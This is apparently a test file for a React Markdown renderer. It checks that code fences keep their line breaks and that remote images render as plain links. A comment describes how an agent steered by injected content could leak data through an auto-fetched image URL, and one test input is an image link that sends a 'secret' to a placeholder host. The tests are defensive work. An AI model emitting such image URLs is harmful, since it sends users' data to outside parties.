import { describe, expect, it } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";
import { Markdown } from "./Markdown";

const html = (md: string) => renderToStaticMarkup(<Markdown>{md}</Markdown>);

const DRAWING = ["```", "┌─────┐", "│  a  │", "└─────┘", "```"].join("\n");

/**
 * The whole point of the component, checked end to end.
 *
 * `isBlockCode` covers the rule; this covers the wiring, which is where it
 * actually went wrong — the rule was fine in isolation and was being asked the
 * wrong question.
 */
describe("what a drawing renders as", () => {
  it("keeps a bare fence on as many lines as it was written on", () => {
    const out = html(DRAWING);
    expect(out).toContain("whitespace-pre");
    expect(out).not.toContain("whitespace-nowrap");
    // The newlines are still newlines, which is what `nowrap` used to eat.
    expect(out).toContain("┌─────┐\n│  a  │\n└─────┘");
  });

  it("renders a tagged fence the same way", () => {
    expect(html("```rust\nlet a = 1;\n```")).toContain("whitespace-pre");
  });

  it("still draws code in a sentence as a chip", () => {
    const out = html("see `crates/ft-core/src/lib.rs` for it");
    expect(out).toContain("whitespace-nowrap");
    expect(out).not.toContain("whitespace-pre");
  });

  it("leaves a block free of the prose measure, and holds prose to it", () => {
    expect(html(DRAWING)).not.toContain("max-w-[72ch]");
    expect(html("a sentence")).toContain("max-w-[72ch]");
  });
});

/**
 * A remote picture is a link, not a request. The shell's `img-src` allows any
 * http(s) origin (for posters), so an `<img>` here would be fetched the moment
 * the message renders — a way out for whatever an agent was steered into
 * putting in the URL, with nobody clicking anything.
 */
describe("what a picture renders as", () => {
  it("draws a remote one as a link, and never as an <img>", () => {
    const out = html("![chart](https://elsewhere.example/?d=secret)");
    expect(out).not.toContain("<img");
    expect(out).toContain('href="https://elsewhere.example/?d=secret"');
    expect(out).toContain(">chart</a>");
  });

  it("names the link by its URL when there is no alt text", () => {
    const out = html("![](//elsewhere.example/x.png)");
    expect(out).not.toContain("<img");
    expect(out).toContain(">//elsewhere.example/x.png</a>");
  });

  it("still draws an inline data: picture, which fetches nothing", () => {
    expect(html("![dot](data:image/png;base64,iVBORw0KGgo=)")).toContain("<img");
  });
});
